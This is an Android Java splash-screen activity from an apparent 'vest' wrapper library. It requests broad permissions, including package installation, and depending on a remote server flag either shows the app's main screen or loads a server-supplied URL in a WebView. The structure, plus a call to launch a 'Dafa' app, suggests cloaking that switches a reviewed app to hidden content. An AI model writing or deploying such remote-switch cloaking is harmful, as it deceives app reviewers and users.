package com.home.vestlibs;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.annotation.NonNull;
import android.widget.ImageView;
import android.widget.TextView;


public class SplashActivity extends BaseActivity {

    TextView tvWelcome;
    ImageView image_splash;

    @Override
    protected int setContentLayout() {
        return R.layout.activity_splash;
    }

    @Override
    protected void initView() {
        tvWelcome = findViewById(R.id.tv_welcome);
        image_splash = findViewById(R.id.image_splash);
        image_splash.setImageResource(VestHelper.getInstance().getSplashRes());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.REQUEST_INSTALL_PACKAGES, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.REQUEST_INSTALL_PACKAGES}, 10086);
        } else {
            choseNext();
        }
    }

    private void choseNext() {
        goNext();
    }

    private void goNext() {
        if (FileUtils.launchDafaApp(this)) {
            System.exit(0);
            finish();
            return;
        }
        DataRequest.getSplashConfigV152(new SplashCallback() {
            @Override
            public void onSuccess(boolean isOpen, String url) {
                final Intent intent = new Intent();
                if (isOpen) {
                    WebbbActivity.startActivity(SplashActivity.this, url);
                } else {
                    intent.setClass(mContext, VestHelper.getInstance().getMainClass());
                    startActivity(intent);
                }
                finish();
            }

            @Override
            public void onFail(String msg) {
                startActivity(new Intent(mContext, VestHelper.getInstance().getMainClass()));
                finish();
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        try {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                choseNext();
            } else {
                showToast("请勾选必要权限");
            }
        } catch (Exception e) {
            choseNext();
        }
    }

    @Override
    protected void initData() {

    }
}
